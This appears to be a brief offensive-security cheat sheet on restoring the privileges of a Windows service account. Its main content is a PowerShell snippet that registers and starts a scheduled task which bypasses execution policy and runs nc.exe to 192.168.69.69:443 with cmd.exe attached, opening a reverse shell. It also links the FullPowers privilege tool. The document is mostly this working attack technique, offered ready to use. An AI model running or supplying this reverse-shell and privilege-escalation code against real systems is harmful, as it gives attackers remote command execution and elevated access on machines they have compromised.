# service account privileges

## restore
permissions can be recovered by creating a scheduled task

### using scheduled task with powershell
```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\windows\tasks\nc.exe 192.168.69.69 443 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
```

### using FullPowers tool
https://github.com/itm4n/FullPowers
